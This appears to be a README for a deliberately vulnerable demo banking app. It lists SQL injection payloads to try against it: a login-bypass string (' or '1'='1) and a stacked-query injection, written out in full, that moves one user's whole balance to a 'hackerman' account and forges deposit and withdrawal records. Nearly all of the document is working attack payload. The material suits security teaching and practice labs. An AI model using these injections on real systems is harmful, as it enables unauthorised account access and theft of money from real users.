# SQL Injections you can try (EASY):
Enter a username into the login field followed by ' or '1'='1
This will let you bypass the password and login as that user.

```
' or '1'='1
```

# SQL Injections you can try (COMPLEX):
Paste the following into the username field. An error will be thrown but the statement will still execute. This query will transfer the entire balance from account with username 'demo' to account 'hackerman'

```
'; UPDATE bank_bankaccount
SET balance = balance + (SELECT balance FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'))
WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman');

INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
VALUES (
  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman')),
  (SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  'All of demo users money!',
  'Deposit',
  '0'
);

INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
VALUES (
  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  -1*(SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  'Youve been hacked by the infamous Hackerman!',
  'Withdrawal',
  '0'
);

UPDATE bank_bankaccount
SET balance = 0
WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'); 

SELECT * FROM auth_user WHERE username='fail
```
